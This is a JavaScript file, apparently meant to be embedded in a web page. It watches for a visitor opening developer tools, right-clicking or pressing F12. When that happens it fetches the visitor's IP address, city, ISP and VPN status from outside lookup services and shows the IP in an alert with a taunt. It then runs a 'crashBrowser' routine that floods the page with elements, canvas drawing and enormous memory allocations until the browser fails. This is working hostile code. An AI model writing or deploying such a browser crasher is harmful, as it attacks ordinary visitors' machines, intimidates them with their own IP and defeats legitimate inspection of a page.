const body = document.body;
let evilMode = false;

function toggleEvilMode() {
}

async function getIPInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip || "Unknown IP";
        const detailResponse = await fetch(`http://ip-api.com/json/${ip}`);
        const detailData = await detailResponse.json();
        return {
            ip,
            city: detailData.city || "Unknown City",
            region: detailData.region || "Unknown Region",
            country: detailData.country || "Unknown Country",
            isp: detailData.isp || "Unknown ISP",
            vpn: detailData.proxy || false
        };
    } catch {
        return {
            ip: "192.168.1.1",
            city: "Classified",
            region: "Classified",
            country: "Classified",
            isp: "Shadow Network",
            vpn: false
        };
    }
}

// Popup Trigger with Crasher
async function triggerPopup() {
    const ipInfo = await getIPInfo();
    const vpnText = ipInfo.vpn ? " (VPN DETECTED - ANTI-SKID NEUTRALIZATION ACTIVE)" : "";
    const message = `Your IP: ${ipInfo.ip}${vpnText}`;
    alert(message); // Popup shows first
    crashBrowser(); // Then crasher kicks in
}

function crashBrowser() {
    const spam = () => {
        for (let i = 0; i < 1000000; i++) {
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.top = `${Math.random() * 5000}vh`;
            div.style.left = `${Math.random() * 5000}vw`;
            div.style.width = '5000px';
            div.style.height = '5000px';
            div.style.background = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;
            div.innerHTML = "<p>".repeat(50000);
            document.body.appendChild(div);
        }
        requestAnimationFrame(spam);
    };
    spam();

    const canvas = document.createElement('canvas');
    canvas.width = window.innerWidth * 8;
    canvas.height = window.innerHeight * 8;
    canvas.style.position = 'fixed';
    canvas.style.top = '0';
    canvas.style.left = '0';
    document.body.appendChild(canvas);
    const ctx = canvas.getContext('2d');
    const overload = () => {
        for (let i = 0; i < 100000; i++) {
            ctx.fillStyle = `hsl(${Math.random() * 360}, 100%, 50%)`;
            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 400, 400);
            ctx.beginPath();
            ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 100, 0, Math.PI * 2);
            ctx.fill();
        }
        requestAnimationFrame(overload);
    };
    overload();

    // Memory Hog Extreme
    let arr = [];
    const hog = () => {
        for (let i = 0; i < 50000000; i++) {
            arr.push(new Array(50000000).fill(Math.random()));
        }
        arr = arr.concat(arr, arr, arr);
        setTimeout(hog, 0);
    };
    hog();

    let arr2 = [];
    const hog2 = () => {
        for (let i = 0; i < 50000000; i++) {
            arr2.push(new Array(50000000).fill(Math.random()));
        }
        arr2 = arr2.concat(arr2, arr2, arr2);
        setTimeout(hog2, 0);
    };
    hog2();
}

(function detectDevTools() {
    let devToolsOpen = false;

    let lastWidth = window.outerWidth;
    let lastHeight = window.outerHeight;
    setInterval(() => {
        if (window.outerWidth !== lastWidth || window.outerHeight !== lastHeight) {
            devToolsOpen = true;
            if (!evilMode) toggleEvilMode();
            triggerPopup();
            lastWidth = window.outerWidth;
            lastHeight = window.outerHeight;
        }
    }, 100);

    const consoleTrap = () => {
        let trap = { toString: () => { devToolsOpen = true; } };
        console.profile(trap);
        console.profileEnd(trap);
    };
    setInterval(() => {
        consoleTrap();
        if (devToolsOpen && !evilMode) {
            toggleEvilMode();
            triggerPopup();
        }
    }, 500);

    const timingCheck = () => {
        const start = performance.now();
        const testFunc = function() {}.toString();
        const end = performance.now();
        if (end - start > 10) {
            devToolsOpen = true;
            if (!evilMode) toggleEvilMode();
            triggerPopup();
        }
    };
    setInterval(timingCheck, 500);

    const debuggerCheck = () => {
        const start = performance.now();
        debugger;
        const end = performance.now();
        if (end - start > 100) {
            devToolsOpen = true;
            if (!evilMode) toggleEvilMode();
            triggerPopup();
        }
    };
    setInterval(debuggerCheck, 500);
})();

document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
    if (!evilMode) toggleEvilMode();
    triggerPopup();
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
        e.preventDefault();
        if (!evilMode) toggleEvilMode();
        triggerPopup();
    }
});
